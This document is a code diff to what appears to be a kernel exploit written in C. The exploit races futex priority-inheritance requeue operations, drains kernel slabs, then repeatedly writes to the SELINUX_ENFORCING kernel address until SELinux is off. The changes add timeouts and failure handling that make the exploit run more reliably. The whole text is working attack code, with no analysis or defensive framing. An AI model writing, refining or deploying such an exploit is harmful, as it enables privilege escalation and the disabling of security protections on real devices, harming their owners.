@@ -56,6 +56,7 @@ atomic_int waiter_ready;
 atomic_int waiter_waiting;
 atomic_int owner_started;
 atomic_int owner_chain_done;
+atomic_int requeue_failed;
 atomic_int route_done;
 atomic_int waiter_tid;
 atomic_int punch_consume_go;
@@ -79,7 +80,20 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
   timeout.tv_sec += ROUTE_WAIT_SECONDS;
   atomic_store(&waiter_waiting, 1);
-  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+  errno = 0;
+  long futex_ret =
+    futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+  int futex_errno = errno;
+
+  if (atomic_load(&requeue_failed)) {
+    pr_error("waiter aborting after cmp_requeue_pi failure futex_ret=%ld errno=%d\n",
+             futex_ret, futex_errno);
+    atomic_store(&route_done, 1);
+    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    while (!atomic_load(&owner_chain_done)) usleep(1000);
+    return NULL;
+  }
+
   do_pselect_fake_lock_route();
   atomic_store(&route_done, 1);
   futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
@@ -93,7 +107,9 @@ void *owner_thread(void *arg __attribute__((unused))) {
   if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
   while (!atomic_load(&waiter_ready)) usleep(1000);
   atomic_store(&owner_started, 1);
-  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  if (OWNER_CHAIN_DEFAULT) {
+    futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  }
   atomic_store(&owner_chain_done, 1);
   for (;;) sleep(1);
 }
@@ -145,6 +161,7 @@ void reset_main_route_state(void) {
   f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
   atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
   atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
+  atomic_store(&requeue_failed, 0);
   atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
   atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
   atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
@@ -159,12 +176,47 @@ void run_main_route_threads(void) {
   SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
-  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
+  int route_timeout_ms = ROUTE_TIMEOUT_MS_DEFAULT;
+  int waited_ms = 0;
+  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
+    if (waited_ms >= route_timeout_ms) {
+      pr_error("route setup timeout waiter_waiting=%d owner_started=%d\n",
+               atomic_load(&waiter_waiting), atomic_load(&owner_started));
+      atomic_store(&punch_consume_stop, 1);
+      return;
+    }
     usleep(1000);
+    waited_ms++;
+  }
   usleep(50000);
   errno = 0;
-  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
-  while (!atomic_load(&route_done)) usleep(5000);
+  long requeue_ret =
+    futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
+  int requeue_errno = errno;
+  pr_info("cmp_requeue_pi ret=%ld errno=%d\n",
+          requeue_ret, requeue_errno);
+  int allow_requeue_fail = REQUEUE_FAIL_OK;
+  if (requeue_ret < 0 && !allow_requeue_fail) {
+    pr_error("cmp_requeue_pi failed; aborting PI route before consumer trigger\n");
+    atomic_store(&requeue_failed, 1);
+    atomic_store(&punch_consume_stop, 1);
+    futex_op(&f_wait, FUTEX_WAKE, 1, NULL, NULL, 0);
+  } else if (requeue_ret < 0) {
+    pr_warning("cmp_requeue_pi failed; continuing because target allows it\n");
+  }
+  waited_ms = 0;
+  while (!atomic_load(&route_done)) {
+    if (waited_ms >= route_timeout_ms) {
+      pr_error("route timeout route_done=0 calls=%d success=%d requeue_ret=%ld "
+               "requeue_errno=%d\n",
+               atomic_load(&consumer_calls), atomic_load(&consumer_success),
+               requeue_ret, requeue_errno);
+      atomic_store(&punch_consume_stop, 1);
+      return;
+    }
+    usleep(5000);
+    waited_ms += 5;
+  }
 }
 
 static int do_one_write(uintptr_t target, const char *desc, int mode) {
@@ -532,9 +584,10 @@ static int run_write1_only(void) {
     return 0;
   }
 
-  for (int att = 1; att <= 20; att++) {
+  const int write1_attempts = 20;
+  for (int att = 1; att <= write1_attempts; att++) {
     slab_drain();
-    pr_info("Write 1 attempt %d/20\n", att);
+    pr_info("Write 1 attempt %d/%d\n", att, write1_attempts);
     do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
     usleep(100000);
     if (check_selinux_off()) {
@@ -542,7 +595,7 @@ static int run_write1_only(void) {
       return 0;
     }
   }
-  pr_error("Write 1 failed after 20 attempts\n");
+  pr_error("Write 1 failed after %d attempts\n", write1_attempts);
   return 1;
 }
 
